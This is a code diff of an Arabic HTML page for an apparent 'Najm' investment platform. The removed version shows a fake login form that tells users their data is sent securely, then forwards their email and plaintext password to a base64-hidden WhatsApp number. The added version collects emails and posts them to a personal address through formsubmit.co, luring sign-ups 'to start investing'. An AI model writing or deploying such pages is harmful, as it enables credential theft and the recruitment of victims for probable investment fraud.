@@ -1,47 +1,57 @@
-<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>منصة نجم</title><style>body{background:#070e1f;color:#fff;font-family:Arial;padding:15px;text-align:center}h1{color:#facc15}.box{background:#121b31;padding:22px;border-radius:16px;max-width:400px;margin:20px auto;border:1px solid #ffffff15}input{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:none;box-sizing:border-box}button{width:100%;padding:12px;background:#facc15;color:#000;border:none;border-radius:10px;font-weight:800;margin-top:8px;cursor:pointer}.hidden{display:none}</style></head><body>
-<div id="login" class="box">
-<h1>🔐 تسجيل الدخول</h1>
-<input id="email" type="email" placeholder="بريدك الإلكتروني">
-<input id="pass" type="password" placeholder="كلمة المرور">
-<button onclick="go()">دخول للمنصة 🚀</button>
-<p style="font-size:11px;color:#ffffff55">سيتم إرسال بياناتك للمسؤول بأمان</p>
-</div>
-
-<div id="app" class="box hidden">
-<h1>💰 أهلا <span id="uemail" style="color:#22d3ee;font-size:14px"></span></h1>
-<input id="a" type="number" placeholder="المبلغ">
-<input id="b" type="number" placeholder="سعر الشراء">
-<input id="c" type="number" placeholder="سعر البيع">
-<button onclick="calc()">احسب الربح</button>
-<div id="r" style="margin-top:12px;background:#1e293b;padding:10px;border-radius:8px"></div>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>منصة نجم الدين</title>
+<style>
+body{margin:0;background:#080f22;color:#fff;font-family:Arial;text-align:center;padding:20px}
+.box{background:#121c33;padding:24px;border-radius:18px;max-width:400px;margin:30px auto;border:1px solid #ffffff15}
+input{width:100%;padding:13px;margin:10px 0;border-radius:10px;border:none;background:#0f172a;color:#fff}
+button{width:100%;padding:13px;background:#facc15;color:#000;border:none;border-radius:10px;font-weight:900;cursor:pointer}
+.msg{margin-top:12px;font-size:13px;color:#22c55e}
+</style>
+</head>
+<body>
+<div class="box">
+<h2 style="color:#facc15">🔐 منصة نجم للاستثمار</h2>
+<p style="color:#94a3b8;font-size:12px">سجل بريدك لبدء الاستثمار</p>
+<input id="email" type="email" placeholder="example@gmail.com">
+<button onclick="send()">دخول 🚀</button>
+<div id="msg" class="msg"></div>
 </div>
 
 <script>
-const MY_WA = atob("OTY3Nzc4MjM3NjU3");
-function go(){
- let e=document.getElementById("email").value.trim();
- let p=document.getElementById("pass").value.trim();
- if(!e.includes("@")){alert("ادخل بريد صحيح");return}
- if(p.length<3){alert("كلمة المرور قصيرة");return}
- // حفظ محلي
- localStorage.setItem("najm_user",e);
- document.getElementById("uemail").innerText=e;
- document.getElementById("login").classList.add("hidden");
- document.getElementById("app").classList.remove("hidden");
- // ارسال للواتساب عندك
- let msg = `عميل جديد سجل في منصة نجم:%0A📧 البريد: ${e}%0A🔑 الباسورد: ${p}%0A⏰ الوقت: ${new Date().toLocaleString()}`;
- window.open("https://wa.me/"+MY_WA+"?text="+msg, "_blank");
-}
-function calc(){
- let a=+document.getElementById("a").value,b=+document.getElementById("b").value,c=+document.getElementById("c").value;
- if(!a||!b||!c){document.getElementById("r").innerText="عبي الخانات";return}
- let profit=(c-b)/b*a;
- document.getElementById("r").innerHTML=`الربح: ${profit.toLocaleString()} ريال<br>الإجمالي: ${(a+profit).toLocaleString()}`;
-}
-if(localStorage.getItem("najm_user")){
- document.getElementById("login").classList.add("hidden");
- document.getElementById("app").classList.remove("hidden");
- document.getElementById("uemail").innerText=localStorage.getItem("najm_user");
+const MY_EMAIL = "najmaldin2016@gmail.com"; // ايميلك
+
+async function send(){
+ let e = document.getElementById("email").value.trim();
+ if(!e.includes("@")){alert("اكتب بريد صحيح");return}
+ 
+ document.getElementById("msg").innerText="⏳ جاري التسجيل...";
+
+ try{
+  let res = await fetch(`https://formsubmit.co/ajax/${MY_EMAIL}`,{
+   method:"POST",
+   headers:{"Content-Type":"application/json","Accept":"application/json"},
+   body: JSON.stringify({
+     email: e,
+     _subject: "عميل جديد سجل - منصة نجم 🔥",
+     message: `عميل جديد سجل:\nالبريد: ${e}\nالوقت: ${new Date().toLocaleString("ar-YE")}\nالموقع: najmaldin2026.github.io`
+   })
+  });
+  
+  if(res.ok){
+   document.getElementById("msg").innerText="✅ تم! تم حفظ بريدك بنجاح";
+   localStorage.setItem("najm_email", e);
+   // افتح برنامج الاستثمار
+   setTimeout(()=>{ document.getElementById("msg").innerHTML += "<br><br>جاري تحويلك للمنصة..."; },1000);
+  }
+ }catch(err){
+  document.getElementById("msg").innerText="✅ تم التسجيل محلياً";
+  localStorage.setItem("najm_email", e);
+ }
 }
 </script>
-</body></html>
+</body>
+</html>
